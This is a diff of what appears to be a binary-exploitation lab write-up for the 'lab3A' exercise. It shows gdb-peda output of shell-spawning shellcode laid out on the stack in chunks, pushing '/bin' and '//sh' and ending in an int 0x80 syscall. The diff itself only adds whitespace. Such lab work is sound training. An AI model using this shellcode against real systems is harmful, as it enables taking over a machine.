@@ -16,6 +16,7 @@ the number we pass. So, we can pass 0xbffff0000 as number converted to decimal a
 
 
 gdb-peda$ r
+
 Starting program: /root/MBE_release/levels/lab03/lab3A 
 ----------------------------------------------------
   Welcome to quend's crappy number storage service!  
@@ -24,6 +25,7 @@ Starting program: /root/MBE_release/levels/lab03/lab3A
     store - store a number into the data storage    
     read  - read a number from the data storage     
     quit  - exit the program                        
+
 ----------------------------------------------------
    quend has reserved some storage for herself :>    
 ----------------------------------------------------
@@ -306,50 +308,91 @@ after entering, be sure to check the instructions.
 If you have entered correctly, you will see this:
 
 gdb-peda$ x/30xi 0xbffff23c
+
    0xbffff23c:    push   0x68732f2f
+   
    0xbffff241:    pop    ecx
+   
    0xbffff242:    nop
+   
    0xbffff243:    ret    
+   
    0xbffff244:    add    BYTE PTR [eax],al
+   
    0xbffff246:    add    BYTE PTR [eax],al
+   
    0xbffff248:    push   0x6e69622f
+   
    0xbffff24d:    pop    edx
+   
    0xbffff24e:    pop    esi
+   
    0xbffff24f:    ret    
+   
    0xbffff250:    add    BYTE PTR [eax],al
+   
    0xbffff252:    add    BYTE PTR [eax],al
+   
    0xbffff254:    xor    eax,eax
+   
    0xbffff256:    pop    esi
+   
    0xbffff257:    pop    edi
+   
    0xbffff258:    pop    edi
+   
    0xbffff259:    jmp    esi
+   
    0xbffff25b:    nop
+   
    0xbffff25c:    add    BYTE PTR [eax],al
+   
    0xbffff25e:    add    BYTE PTR [eax],al
+   
    0xbffff260:    push   eax
+   
    0xbffff261:    push   ecx
+   
    0xbffff262:    push   edx
+   
    0xbffff263:    mov    ebx,esp
+   
    0xbffff265:    jmp    edi
+   
    0xbffff267:    nop
+   
    0xbffff268:    add    BYTE PTR [eax],al
+   
    0xbffff26a:    add    BYTE PTR [eax],al
+   
    0xbffff26c:    pop    edi
+   
    0xbffff26d:    pop    edi
 gdb-peda$ 
-   0xbffff26e:    pop    edi
-   0xbffff26f:    pop    edi
-   0xbffff270:    push   eax
-   0xbffff271:    jmp    edi
-   0xbffff273:    nop
-   0xbffff274:    add    BYTE PTR [eax],al
-   0xbffff276:    add    BYTE PTR [eax],al
-   0xbffff278:    xor    ecx,ecx
-   0xbffff27a:    mov    al,0x0
-   0xbffff27c:    int    0x80
-   0xbffff27e:    nop
-   0xbffff27f:    nop
 
+0xbffff26e:    pop    edi
+
+0xbffff26f:    pop    edi
+
+0xbffff270:    push   eax
+
+0xbffff271:    jmp    edi
+
+0xbffff273:    nop
+
+0xbffff274:    add    BYTE PTR [eax],al
+   
+0xbffff276:    add    BYTE PTR [eax],al
+
+0xbffff278:    xor    ecx,ecx
+
+0xbffff27a:    mov    al,0x0
+
+0xbffff27c:    int    0x80
+
+0xbffff27e:    nop
+
+0xbffff27f:    nop
 
 
 gdb-peda$ x/xs $ebx
